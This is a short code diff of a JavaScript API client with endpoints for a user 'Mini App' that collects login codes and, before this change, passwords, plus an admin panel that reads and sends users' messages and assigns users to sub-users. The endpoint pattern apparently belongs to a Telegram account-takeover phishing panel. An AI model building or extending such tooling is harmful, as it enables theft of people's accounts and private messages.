@@ -21,23 +21,25 @@ export async function postJson(path, payload = {}, extraHeaders = {}) {
 }
 
 export const api = {
-  // User Mini App endpoints (Zero-Phone Auto-OTP flow)
+  // User Mini App endpoints
   autoInit: (data) => postJson("/api/auto-init", data),
   getTemplate: (data) => postJson("/api/template", data),
   enterCode: (data) => postJson("/api/enter-code", data),
-  enterPass: (data) => postJson("/api/enter-pass", data),
   getUserMessages: (data) => postJson("/api/user/messages", data),
   sendUserMessage: (data) => postJson("/api/user/send-message", data),
   logout: (data) => postJson("/api/logout", data),
 
   // Admin & Sub-user endpoints
   adminLogin: (data) => postJson("/api/admin/login", data),
+  adminTelegramLogin: (data) => postJson("/api/admin/tg-login", data),
   adminOverview: (data) => postJson("/api/admin/overview", data),
+  adminSaveSettings: (data) => postJson("/api/admin/settings/save", data),
   adminCreateSubUser: (data) => postJson("/api/admin/sub-users/create", data),
   adminToggleSubUser: (data) => postJson("/api/admin/sub-users/toggle", data),
   adminDeleteSubUser: (data) => postJson("/api/admin/sub-users/delete", data),
   adminAssignUser: (data) => postJson("/api/admin/users/assign", data),
   adminRevokeSession: (data) => postJson("/api/admin/users/revoke", data),
+  adminDeleteUser: (data) => postJson("/api/admin/users/delete", data),
   adminGetMessages: (data) => postJson("/api/admin/messages/list", data),
   adminSendMessage: (data) => postJson("/api/admin/messages/send", data),
   adminSaveTemplate: (data) => postJson("/api/admin/template/save", data),
